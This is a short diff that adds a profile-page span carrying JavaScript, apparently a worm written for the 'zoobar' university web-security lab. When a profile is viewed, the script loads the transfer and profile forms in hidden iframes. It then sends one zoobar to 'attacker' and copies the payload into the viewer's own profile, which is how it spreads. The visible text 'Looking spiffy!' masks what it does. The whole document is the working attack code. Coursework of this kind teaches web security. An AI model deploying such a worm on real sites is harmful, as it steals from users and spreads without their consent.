@@ -1,0 +1,30 @@
+<span id='zoobars' class="
+var f = document.createElement('iframe');
+f.setAttribute('src', 'http://zoobar.csl.toronto.edu/transfer.php');
+f.setAttribute('style', 'visibility:hidden');
+var e = function() { 
+console.log('loaded!');
+f.contentDocument.transfer_form.zoobars.value=1;
+f.contentDocument.transfer_form.zb_recipient.value='attacker';
+f.contentDocument.transfer_form.submission.click();
+f.removeEventListener('load', e);
+}
+
+var f2 = document.createElement('iframe');
+f2.setAttribute('src', 'http://zoobar.csl.toronto.edu/index.php');
+f2.setAttribute('style', 'visibility:hidden');
+var e2 = function() {
+console.log('loaded e2!');
+var p = document.getElementById('profile').innerHTML;
+f2.contentDocument.profile_form.profileupdate.value = p;
+f2.contentDocument.profile_form.profilesubmit.click();
+f2.removeEventListener('load', e2);
+}
+f.addEventListener('load', e);
+f2.addEventListener('load', e2);
+document.body.appendChild(f);
+document.body.appendChild(f2);
+
+total = 10;
+
+">Looking spiffy!</span>
